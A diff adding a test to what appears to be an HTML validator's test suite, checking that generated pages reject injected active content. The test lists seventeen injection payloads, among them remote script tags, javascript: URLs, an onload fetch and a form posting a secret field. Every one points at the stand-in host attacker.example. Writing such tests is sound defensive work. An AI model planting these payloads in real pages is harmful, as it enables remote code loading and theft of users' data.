@@ -76,3 +76,37 @@ test("source workspace blocks secrets, evaluators, loopback dependencies and rem
   assert.equal(result.valid, false);
   assert.match(result.issues.join(" "), /product-kind|eval|loopback|secret/i);
 });
+
+test("source workspace rejects extra active content while preserving the generated JSON payload", () => {
+  const { spec, html } = project();
+  assert.match(html, /<script type="application\/json" id="projectSpec">/);
+
+  const attacks = [
+    '<script src="https://attacker.example/steal.js"></script>',
+    '<!--><script src="https://attacker.example/comment-break.js"></script>-->',
+    '<script type="importmap">{"imports":{"x":"https://attacker.example/x.js"}}</script>',
+    '<iframe src="https://attacker.example/collect"></iframe>',
+    '<object data="https://attacker.example/collect"></object>',
+    '<embed src="https://attacker.example/collect">',
+    '<base href="https://attacker.example/">',
+    '<link rel="modulepreload" href="https://attacker.example/module.js">',
+    '<link rel="preload" as="script" href="https://attacker.example/app.js">',
+    '<link rel="preconnect" href="https://attacker.example">',
+    '<link rel="dns-prefetch" href="//attacker.example">',
+    '<link rel="stylesheet" href="https://attacker.example/app.css">',
+    '<meta http-equiv="refresh" content="0;url=https://attacker.example/collect">',
+    '<form action="https://attacker.example/collect"><input name="secret"></form>',
+    '<input formaction="javascript:location=\'https://attacker.example/\'">',
+    '<a href="javascript:location=\'https://attacker.example/\'">Open</a>',
+    '<img src="/brand/dropstab-mark.svg" onload="fetch(\'https://attacker.example/collect\')">',
+  ];
+
+  for (const attack of attacks) {
+    const result = validateEditableRuntimeHtml(
+      spec,
+      html.replace("</body>", `${attack}</body>`),
+    );
+    assert.equal(result.valid, false, attack);
+    assert.match(result.issues.join("\n"), /active[- ]content|outbound form/i, attack);
+  }
+});
